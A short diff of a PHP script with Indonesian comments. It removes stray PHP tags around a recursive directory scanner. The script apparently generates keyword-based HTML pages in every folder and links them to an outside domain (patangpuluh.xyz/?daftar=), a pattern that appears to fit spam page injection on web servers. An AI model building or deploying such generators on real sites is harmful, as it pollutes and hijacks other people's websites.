@@ -76,7 +76,6 @@ function generateHTMLFile($keyword, $templateFile, $generatePerFolder, $generate
             exit;
         }
 
-<?php
 
 // Fungsi untuk menyusuri direktori secara rekursif dan menyusun semua jalur
 function scanDirectories($dir, &$results = array()) {
@@ -123,7 +122,6 @@ if (!empty($directories)) {
     echo "Tidak ada direktori ditemukan.";
 }
 
-?>
 
     $amp = 'https://patangpuluh.xyz/?daftar=' . $keyword;
     // Ganti #domain dengan direktori saat ini dan nama folder yang dibuat
